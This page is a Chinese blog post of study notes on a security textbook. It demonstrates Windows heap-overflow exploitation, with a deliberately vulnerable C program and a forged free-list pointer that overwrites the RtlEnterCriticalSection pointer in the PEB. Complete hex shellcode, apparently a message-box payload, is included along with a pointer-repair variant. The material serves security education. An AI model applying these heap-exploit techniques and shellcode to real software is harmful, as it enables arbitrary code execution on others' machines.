@@ -1,0 +1,444 @@
+<!DOCTYPE html>
+<html lang="zh-CN">
+<head>
+  <meta charset="UTF-8">
+<meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=2">
+<meta name="theme-color" content="#222">
+<meta name="generator" content="Hexo 6.2.0">
+  <link rel="apple-touch-icon" sizes="180x180" href="/images/apple-touch-icon-next.png">
+  <link rel="icon" type="image/png" sizes="32x32" href="/images/favicon-32x32-next.png">
+  <link rel="icon" type="image/png" sizes="16x16" href="/images/favicon-16x16-next.png">
+  <link rel="mask-icon" href="/images/logo.svg" color="#222">
+
+<link rel="stylesheet" href="/css/main.css">
+
+
+<link rel="stylesheet" href="/lib/font-awesome/css/all.min.css">
+
+<script id="hexo-configurations">
+    var NexT = window.NexT || {};
+    var CONFIG = {"hostname":"example.com","root":"/","scheme":"Pisces","version":"7.8.0","exturl":false,"sidebar":{"position":"left","display":"post","padding":18,"offset":12,"onmobile":false},"copycode":{"enable":false,"show_result":false,"style":null},"back2top":{"enable":true,"sidebar":false,"scrollpercent":false},"bookmark":{"enable":false,"color":"#222","save":"auto"},"fancybox":false,"mediumzoom":false,"lazyload":false,"pangu":false,"comments":{"style":"tabs","active":null,"storage":true,"lazyload":false,"nav":null},"algolia":{"hits":{"per_page":10},"labels":{"input_placeholder":"Search for Posts","hits_empty":"We didn't find any results for the search: ${query}","hits_stats":"${hits} results found in ${time} ms"}},"localsearch":{"enable":false,"trigger":"auto","top_n_per_article":1,"unescape":false,"preload":false},"motion":{"enable":true,"async":false,"transition":{"post_block":"fadeIn","post_header":"slideDownIn","post_body":"slideDownIn","coll_header":"slideLeftIn","sidebar":"slideUpIn"}}};
+  </script>
+
+  <meta name="description" content="《0day安全：软件漏洞分析技术第二版》学习笔记">
+<meta property="og:type" content="article">
+<meta property="og:title" content="Windows堆溢出利用之代码植入">
+<meta property="og:url" content="http://example.com/2022/06/13/Windows%E5%A0%86%E6%BA%A2%E5%87%BA%E5%88%A9%E7%94%A8%E4%B9%8B%E4%BB%A3%E7%A0%81%E6%A4%8D%E5%85%A5/index.html">
+<meta property="og:site_name" content="困在池塘里的鲸">
+<meta property="og:description" content="《0day安全：软件漏洞分析技术第二版》学习笔记">
+<meta property="og:locale" content="zh_CN">
+<meta property="og:image" content="https://s2.loli.net/2022/06/13/Xb3etWxOQmlqK2R.png">
+<meta property="og:image" content="https://s2.loli.net/2022/06/13/bWCF6pm97oEiZNL.png">
+<meta property="og:image" content="https://s2.loli.net/2022/06/13/PuKlH38swkqJZxt.png">
+<meta property="og:image" content="https://s2.loli.net/2022/06/13/47gdona8pJSqWQl.png">
+<meta property="article:published_time" content="2022-06-13T12:40:13.000Z">
+<meta property="article:modified_time" content="2022-06-13T12:41:01.642Z">
+<meta property="article:author" content="yu1e">
+<meta property="article:tag" content="学习笔记">
+<meta name="twitter:card" content="summary">
+<meta name="twitter:image" content="https://s2.loli.net/2022/06/13/Xb3etWxOQmlqK2R.png">
+
+<link rel="canonical" href="http://example.com/2022/06/13/Windows%E5%A0%86%E6%BA%A2%E5%87%BA%E5%88%A9%E7%94%A8%E4%B9%8B%E4%BB%A3%E7%A0%81%E6%A4%8D%E5%85%A5/">
+
+
+<script id="page-configurations">
+  // https://hexo.io/docs/variables.html
+  CONFIG.page = {
+    sidebar: "",
+    isHome : false,
+    isPost : true,
+    lang   : 'zh-CN'
+  };
+</script>
+
+  <title>Windows堆溢出利用之代码植入 | 困在池塘里的鲸</title>
+  
+
+
+
+
+
+
+  <noscript>
+  <style>
+  .use-motion .brand,
+  .use-motion .menu-item,
+  .sidebar-inner,
+  .use-motion .post-block,
+  .use-motion .pagination,
+  .use-motion .comments,
+  .use-motion .post-header,
+  .use-motion .post-body,
+  .use-motion .collection-header { opacity: initial; }
+
+  .use-motion .site-title,
+  .use-motion .site-subtitle {
+    opacity: initial;
+    top: initial;
+  }
+
+  .use-motion .logo-line-before i { left: initial; }
+  .use-motion .logo-line-after i { right: initial; }
+  </style>
+</noscript>
+
+</head>
+
+<body itemscope itemtype="http://schema.org/WebPage">
+  <div class="container use-motion">
+    <div class="headband"></div>
+
+    <header class="header" itemscope itemtype="http://schema.org/WPHeader">
+      <div class="header-inner"><div class="site-brand-container">
+  <div class="site-nav-toggle">
+    <div class="toggle" aria-label="切换导航栏">
+      <span class="toggle-line toggle-line-first"></span>
+      <span class="toggle-line toggle-line-middle"></span>
+      <span class="toggle-line toggle-line-last"></span>
+    </div>
+  </div>
+
+  <div class="site-meta">
+
+    <a href="/" class="brand" rel="start">
+      <span class="logo-line-before"><i></i></span>
+      <h1 class="site-title">困在池塘里的鲸</h1>
+      <span class="logo-line-after"><i></i></span>
+    </a>
+      <p class="site-subtitle" itemprop="description">Hacking and Coding</p>
+  </div>
+
+  <div class="site-nav-right">
+    <div class="toggle popup-trigger">
+    </div>
+  </div>
+</div>
+
+
+
+
+<nav class="site-nav">
+  <ul id="menu" class="main-menu menu">
+        <li class="menu-item menu-item-home">
+
+    <a href="/" rel="section"><i class="fa fa-home fa-fw"></i>首页</a>
+
+  </li>
+        <li class="menu-item menu-item-about">
+
+    <a href="/about/" rel="section"><i class="fa fa-user fa-fw"></i>关于</a>
+
+  </li>
+        <li class="menu-item menu-item-tags">
+
+    <a href="/tags/" rel="section"><i class="fa fa-tags fa-fw"></i>标签</a>
+
+  </li>
+        <li class="menu-item menu-item-archives">
+
+    <a href="/archives/" rel="section"><i class="fa fa-archive fa-fw"></i>归档</a>
+
+  </li>
+  </ul>
+</nav>
+
+
+
+
+</div>
+    </header>
+
+    
+  <div class="back-to-top">
+    <i class="fa fa-arrow-up"></i>
+    <span>0%</span>
+  </div>
+
+
+    <main class="main">
+      <div class="main-inner">
+        <div class="content-wrap">
+          
+
+          <div class="content post posts-expand">
+            
+
+    
+  
+  
+  <article itemscope itemtype="http://schema.org/Article" class="post-block" lang="zh-CN">
+    <link itemprop="mainEntityOfPage" href="http://example.com/2022/06/13/Windows%E5%A0%86%E6%BA%A2%E5%87%BA%E5%88%A9%E7%94%A8%E4%B9%8B%E4%BB%A3%E7%A0%81%E6%A4%8D%E5%85%A5/">
+
+    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
+      <meta itemprop="image" content="/images/avatar.gif">
+      <meta itemprop="name" content="yu1e">
+      <meta itemprop="description" content="昨夜，说是梅花谢了。">
+    </span>
+
+    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
+      <meta itemprop="name" content="困在池塘里的鲸">
+    </span>
+      <header class="post-header">
+        <h1 class="post-title" itemprop="name headline">
+          Windows堆溢出利用之代码植入
+        </h1>
+
+        <div class="post-meta">
+            <span class="post-meta-item">
+              <span class="post-meta-item-icon">
+                <i class="far fa-calendar"></i>
+              </span>
+              <span class="post-meta-item-text">发表于</span>
+              
+
+              <time title="创建时间：2022-06-13 20:40:13 / 修改时间：20:41:01" itemprop="dateCreated datePublished" datetime="2022-06-13T20:40:13+08:00">2022-06-13</time>
+            </span>
+
+          
+            <div class="post-description">《0day安全：软件漏洞分析技术第二版》学习笔记</div>
+
+        </div>
+      </header>
+
+    
+    
+    
+    <div class="post-body" itemprop="articleBody">
+
+      
+        <h4 id="狙击P-E-B中RtlEnterCritical-Section-的函数指针"><a href="#狙击P-E-B中RtlEnterCritical-Section-的函数指针" class="headerlink" title="狙击P.E.B中RtlEnterCritical-Section()的函数指针"></a><u>狙击P.E.B中RtlEnterCritical-Section()的函数指针</u></h4><p>Windows为了同步进程下的多个线程，使用了一些同步措施，如锁机制（lock）、信号量（semaphore）、临界区（critical section）等，这些都是操作系统的相关知识，不再赘述。</p>
+<p>当进程退出时，ExitProcess()函数要做很多工作，其中必然要用到临界区函RtlEnterCriticalSection()和RtlLeaveCriticalSection()来同步线程。</p>
+<p>微软在开发Windows的时候，ExitProcess()函数调用临界区函数的方法比较独特，是通过进程环境块P.E.B中偏移0x20处存放的函数指针来间接完成的，具体点说就是在0x7FFDF020处存放着指向RtlEnterCriticalSection()的指针，在0x7FFDF024处存放着指向RtlLeaveCriticalSection()的指针。</p>
+<p>这里以0x7FFDF020处的指向RtlEnterCriticalSection()的指针为目标，进行DOWRD SHOOT后，劫持进程、代码植入的操作。</p>
+<p>代码如下：</p>
+<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;windows.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="type">char</span> shellcode[]=<span class="string">&quot;...&quot;</span></span><br><span class="line"></span><br><span class="line">main()</span><br><span class="line">&#123;</span><br><span class="line"></span><br><span class="line">	HLOCAL h1 = <span class="number">0</span>, h2 = <span class="number">0</span>;</span><br><span class="line">	HANDLE hp;</span><br><span class="line">	hp = HeapCreate(<span class="number">0</span>,<span class="number">0x1000</span>,<span class="number">0x10000</span>);</span><br><span class="line">	h1 = HeapAlloc(hp,HEAP_ZERO_MEMORY,<span class="number">200</span>);</span><br><span class="line">	__asm <span class="type">int</span> <span class="number">3</span> <span class="comment">//used to break the process</span></span><br><span class="line">	<span class="comment">//memcpy(h1,shellcode,200); //normal cpy, used to watch the heap</span></span><br><span class="line">	<span class="built_in">memcpy</span>(h1,shellcode,<span class="number">0x200</span>); <span class="comment">//overflow,0x200=512</span></span><br><span class="line">	h2 = HeapAlloc(hp,HEAP_ZERO_MEMORY,<span class="number">8</span>);</span><br><span class="line">	<span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<p>1）h1向堆中申请200字节</p>
+<p>2）memcpy的上限为0x200，也就是512字节，产生溢出</p>
+<p>3）H1之后紧接着就是尾块</p>
+<p>4）超过200字节的部分将覆盖尾块</p>
+<p>5）用伪造的指针覆盖尾块块首中的空表指针，当h2分配的时候，导致DWORD SHOOT</p>
+<p>6）DWORD SHOOT的目标是0x7FFDF020处的RtlEnterCriticalSection()函数指针，可以将这个位置手动修改为shellcode的位置</p>
+<p>7）DWORD SHOOT完毕后，堆溢出导致异常，最终调用ExitProcess()结束进程</p>
+<p>可以先向堆中复制200个0x90字节，看一下堆中的情况</p>
+<p>先不运行memcpy，看一下堆的情况</p>
+<p>0x00520178处的freelist[0]指向的是尾块，尾块的地址为0x00520758，h1的起始地址为0x00520680</p>
+<p><img src="https://s2.loli.net/2022/06/13/Xb3etWxOQmlqK2R.png" alt="image.png"></p>
+<p><img src="https://s2.loli.net/2022/06/13/bWCF6pm97oEiZNL.png" alt="image.png"></p>
+<p>h1的size字段为0x001A，也就是26*8&#x3D;208字节（申请200字节的data区，还要加上前面的块首）</p>
+<p>复制200个字节的0x90字节之后，看一下堆</p>
+<p><img src="https://s2.loli.net/2022/06/13/PuKlH38swkqJZxt.png" alt="image.png"></p>
+<p>很明显0x00520758处就是空表指针</p>
+<p>缓冲区布置如下：</p>
+<p>1）将168字节的shellcode用0x90补充为200字节</p>
+<p>2）后面开始覆盖尾块，先是尾块的块首信息，为了防止发生异常，直接保持内存中原来的数据”\x16\x01\x1A\x00\x00\x10\x00\x00”</p>
+<p>3）前向指针使用shellcode的起始地址0x00520688</p>
+<p>4）后向指针是P.E.B中的函数指针地址0x7FFDF020</p>
+<p>shellcode如下：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br></pre></td><td class="code"><pre><span class="line">char shellcode[]=</span><br><span class="line"></span><br><span class="line">&quot;\x90\x90\x90\x90\x90\x90\x90\x90&quot;</span><br><span class="line"></span><br><span class="line">&quot;\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90&quot;</span><br><span class="line"></span><br><span class="line">&quot;\xFC\x68\x6A\x0A\x38\x1E\x68\x63\x89\xD1\x4F\x68\x32\x74\x91\x0C&quot;</span><br><span class="line"></span><br><span class="line">&quot;\x8B\xF4\x8D\x7E\xF4\x33\xDB\xB7\x04\x2B\xE3\x66\xBB\x33\x32\x53&quot;</span><br><span class="line"></span><br><span class="line">&quot;\x68\x75\x73\x65\x72\x54\x33\xD2\x64\x8B\x5A\x30\x8B\x4B\x0C\x8B&quot;</span><br><span class="line"></span><br><span class="line">&quot;\x49\x1C\x8B\x09\x8B\x69\x08\xAD\x3D\x6A\x0A\x38\x1E\x75\x05\x95&quot;</span><br><span class="line"></span><br><span class="line">&quot;\xFF\x57\xF8\x95\x60\x8B\x45\x3C\x8B\x4C\x05\x78\x03\xCD\x8B\x59&quot;</span><br><span class="line"></span><br><span class="line">&quot;\x20\x03\xDD\x33\xFF\x47\x8B\x34\xBB\x03\xF5\x99\x0F\xBE\x06\x3A&quot;</span><br><span class="line"></span><br><span class="line">&quot;\xC4\x74\x08\xC1\xCA\x07\x03\xD0\x46\xEB\xF1\x3B\x54\x24\x1C\x75&quot;</span><br><span class="line"></span><br><span class="line">&quot;\xE4\x8B\x59\x24\x03\xDD\x66\x8B\x3C\x7B\x8B\x59\x1C\x03\xDD\x03&quot;</span><br><span class="line"></span><br><span class="line">&quot;\x2C\xBB\x95\x5F\xAB\x57\x61\x3D\x6A\x0A\x38\x1E\x75\xA9\x33\xDB&quot;</span><br><span class="line"></span><br><span class="line">&quot;\x53\x68\x77\x65\x73\x74\x68\x66\x61\x69\x6C\x8B\xC4\x53\x50\x50&quot;</span><br><span class="line"></span><br><span class="line">&quot;\x53\xFF\x57\xFC\x53\xFF\x57\xF8\x90\x90\x90\x90\x90\x90\x90\x90&quot;</span><br><span class="line"></span><br><span class="line">&quot;\x16\x01\x1A\x00\x00\x10\x00\x00&quot;// head of the ajacent free block</span><br><span class="line"></span><br><span class="line">&quot;\x88\x06\x52\x00\x20\xf0\xfd\x7f&quot;;</span><br><span class="line"></span><br><span class="line">//0x00520688 is the address of shellcode in first heap block </span><br><span class="line"></span><br><span class="line">//0x7ffdf020 is the position in PEB which hold a pointer to RtlEnterCriticalSection()</span><br><span class="line"></span><br><span class="line">//and will be called by ExitProcess() at last</span><br></pre></td></tr></table></figure>
+
+<p>但是运行的时候并没有看到弹框，因为shellcode中也会使用P.E.B中的函数指针，当shellcode的函数使用临界区时，也会跑偏</p>
+<p>所以需要在shellcode中一开始就把DWORD SHOOT的指针修复回去，记录一下0x7FFDF020处的函数指针为0x77F82060</p>
+<p><em><strong>注意：P.E.B中存放RtlEnterCriticalSection()函数指针的位置0x7FFDF020是固定的，但是，RtlEnterCriticalSection()的地址也就是这个指针的值0x77F82060是变化的，需要调试确定。</strong></em></p>
+<p>通过如下三条指令修复P.E.B的指针</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">MOV EAX,0x7FFDF020</span><br><span class="line"></span><br><span class="line">MOV EBX,0x77F82060</span><br><span class="line"></span><br><span class="line">MOV [EAX],EBX</span><br></pre></td></tr></table></figure>
+
+<p>将这三条指令放在shellcode之前</p>
+<p>shellcode如下：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br></pre></td><td class="code"><pre><span class="line">char shellcode[]=</span><br><span class="line"></span><br><span class="line">&quot;\x90\x90\x90\x90\x90\x90\x90\x90&quot;</span><br><span class="line"></span><br><span class="line">&quot;\x90\x90\x90\x90&quot;</span><br><span class="line"></span><br><span class="line">//repaire the pointer which shooted by heap over run</span><br><span class="line"></span><br><span class="line">&quot;\xB8\x20\xF0\xFD\x7F&quot;  //MOV EAX,7FFDF020</span><br><span class="line"></span><br><span class="line">&quot;\xBB\x60\x20\xF8\x77&quot;  //MOV EBX,77F8AA4C the address here may releated to your OS</span><br><span class="line"></span><br><span class="line">&quot;\x89\x18&quot;				//MOV DWORD PTR DS:[EAX],EBX</span><br><span class="line"></span><br><span class="line">&quot;\xFC\x68\x6A\x0A\x38\x1E\x68\x63\x89\xD1\x4F\x68\x32\x74\x91\x0C&quot;</span><br><span class="line"></span><br><span class="line">&quot;\x8B\xF4\x8D\x7E\xF4\x33\xDB\xB7\x04\x2B\xE3\x66\xBB\x33\x32\x53&quot;</span><br><span class="line"></span><br><span class="line">&quot;\x68\x75\x73\x65\x72\x54\x33\xD2\x64\x8B\x5A\x30\x8B\x4B\x0C\x8B&quot;</span><br><span class="line"></span><br><span class="line">&quot;\x49\x1C\x8B\x09\x8B\x69\x08\xAD\x3D\x6A\x0A\x38\x1E\x75\x05\x95&quot;</span><br><span class="line"></span><br><span class="line">&quot;\xFF\x57\xF8\x95\x60\x8B\x45\x3C\x8B\x4C\x05\x78\x03\xCD\x8B\x59&quot;</span><br><span class="line"></span><br><span class="line">&quot;\x20\x03\xDD\x33\xFF\x47\x8B\x34\xBB\x03\xF5\x99\x0F\xBE\x06\x3A&quot;</span><br><span class="line"></span><br><span class="line">&quot;\xC4\x74\x08\xC1\xCA\x07\x03\xD0\x46\xEB\xF1\x3B\x54\x24\x1C\x75&quot;</span><br><span class="line"></span><br><span class="line">&quot;\xE4\x8B\x59\x24\x03\xDD\x66\x8B\x3C\x7B\x8B\x59\x1C\x03\xDD\x03&quot;</span><br><span class="line"></span><br><span class="line">&quot;\x2C\xBB\x95\x5F\xAB\x57\x61\x3D\x6A\x0A\x38\x1E\x75\xA9\x33\xDB&quot;</span><br><span class="line"></span><br><span class="line">&quot;\x53\x68\x77\x65\x73\x74\x68\x66\x61\x69\x6C\x8B\xC4\x53\x50\x50&quot;</span><br><span class="line"></span><br><span class="line">&quot;\x53\xFF\x57\xFC\x53\xFF\x57\xF8\x90\x90\x90\x90\x90\x90\x90\x90&quot;</span><br><span class="line"></span><br><span class="line">&quot;\x16\x01\x1A\x00\x00\x10\x00\x00&quot;// head of the ajacent free block</span><br><span class="line"></span><br><span class="line">&quot;\x88\x06\x52\x00\x20\xf0\xfd\x7f&quot;;</span><br><span class="line"></span><br><span class="line">//0x00520688 is the address of shellcode in first heap block, you have to make sure this address via debug </span><br><span class="line"></span><br><span class="line">//0x7ffdf020 is the position in PEB which hold a pointer to RtlEnterCriticalSection()</span><br><span class="line"></span><br><span class="line">//and will be called by ExitProcess() at last</span><br></pre></td></tr></table></figure>
+
+<p>直接运行，点击返回之后弹框</p>
+<p><img src="https://s2.loli.net/2022/06/13/47gdona8pJSqWQl.png" alt="image.png"></p>
+
+    </div>
+
+    
+    
+    
+
+      <footer class="post-footer">
+          <div class="post-tags">
+              <a href="/tags/%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/" rel="tag"># 学习笔记</a>
+          </div>
+
+        
+
+
+        
+    <div class="post-nav">
+      <div class="post-nav-item">
+    <a href="/2022/06/12/windows-HeapDebugging/" rel="prev" title="windows堆调试">
+      <i class="fa fa-chevron-left"></i> windows堆调试
+    </a></div>
+      <div class="post-nav-item">
+    <a href="/2022/06/13/Windows%E5%A0%86%E6%BA%A2%E5%87%BA%E5%8E%9F%E7%90%86%E5%92%8C%E8%B0%83%E8%AF%95/" rel="next" title="Windows堆溢出原理和调试">
+      Windows堆溢出原理和调试 <i class="fa fa-chevron-right"></i>
+    </a></div>
+    </div>
+      </footer>
+    
+  </article>
+  
+  
+  
+
+
+
+          </div>
+          
+
+<script>
+  window.addEventListener('tabs:register', () => {
+    let { activeClass } = CONFIG.comments;
+    if (CONFIG.comments.storage) {
+      activeClass = localStorage.getItem('comments_active') || activeClass;
+    }
+    if (activeClass) {
+      let activeTab = document.querySelector(`a[href="#comment-${activeClass}"]`);
+      if (activeTab) {
+        activeTab.click();
+      }
+    }
+  });
+  if (CONFIG.comments.storage) {
+    window.addEventListener('tabs:click', event => {
+      if (!event.target.matches('.tabs-comment .tab-content .tab-pane')) return;
+      let commentClass = event.target.classList[1];
+      localStorage.setItem('comments_active', commentClass);
+    });
+  }
+</script>
+
+        </div>
+          
+  
+  <div class="toggle sidebar-toggle">
+    <span class="toggle-line toggle-line-first"></span>
+    <span class="toggle-line toggle-line-middle"></span>
+    <span class="toggle-line toggle-line-last"></span>
+  </div>
+
+  <aside class="sidebar">
+    <div class="sidebar-inner">
+
+      <ul class="sidebar-nav motion-element">
+        <li class="sidebar-nav-toc">
+          文章目录
+        </li>
+        <li class="sidebar-nav-overview">
+          站点概览
+        </li>
+      </ul>
+
+      <!--noindex-->
+      <div class="post-toc-wrap sidebar-panel">
+          <div class="post-toc motion-element"><ol class="nav"><li class="nav-item nav-level-4"><a class="nav-link" href="#%E7%8B%99%E5%87%BBP-E-B%E4%B8%ADRtlEnterCritical-Section-%E7%9A%84%E5%87%BD%E6%95%B0%E6%8C%87%E9%92%88"><span class="nav-number">1.</span> <span class="nav-text">狙击P.E.B中RtlEnterCritical-Section()的函数指针</span></a></li></ol></div>
+      </div>
+      <!--/noindex-->
+
+      <div class="site-overview-wrap sidebar-panel">
+        <div class="site-author motion-element" itemprop="author" itemscope itemtype="http://schema.org/Person">
+  <p class="site-author-name" itemprop="name">yu1e</p>
+  <div class="site-description" itemprop="description">昨夜，说是梅花谢了。</div>
+</div>
+<div class="site-state-wrap motion-element">
+  <nav class="site-state">
+      <div class="site-state-item site-state-posts">
+          <a href="/archives/">
+        
+          <span class="site-state-item-count">11</span>
+          <span class="site-state-item-name">日志</span>
+        </a>
+      </div>
+      <div class="site-state-item site-state-tags">
+            <a href="/tags/">
+          
+        <span class="site-state-item-count">3</span>
+        <span class="site-state-item-name">标签</span></a>
+      </div>
+  </nav>
+</div>
+
+
+
+      </div>
+
+    </div>
+  </aside>
+  <div id="sidebar-dimmer"></div>
+
+
+      </div>
+    </main>
+
+    <footer class="footer">
+      <div class="footer-inner">
+        
+
+        
+
+<div class="copyright">
+  
+  &copy; 
+  <span itemprop="copyrightYear">2022</span>
+  <span class="with-love">
+    <i class="fa fa-heart"></i>
+  </span>
+  <span class="author" itemprop="copyrightHolder">yu1e</span>
+</div>
+  <div class="powered-by">由 <a href="https://hexo.io/" class="theme-link" rel="noopener" target="_blank">Hexo</a> & <a href="https://pisces.theme-next.org/" class="theme-link" rel="noopener" target="_blank">NexT.Pisces</a> 强力驱动
+  </div>
+
+        
+
+
+
+
+
+
+
+
+      </div>
+    </footer>
+  </div>
+
+  
+  <script src="/lib/anime.min.js"></script>
+  <script src="/lib/velocity/velocity.min.js"></script>
+  <script src="/lib/velocity/velocity.ui.min.js"></script>
+
+<script src="/js/utils.js"></script>
+
+<script src="/js/motion.js"></script>
+
+
+<script src="/js/schemes/pisces.js"></script>
+
+
+<script src="/js/next-boot.js"></script>
+
+
+
+
+  
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+  
+
+  
+
+</body>
+</html>
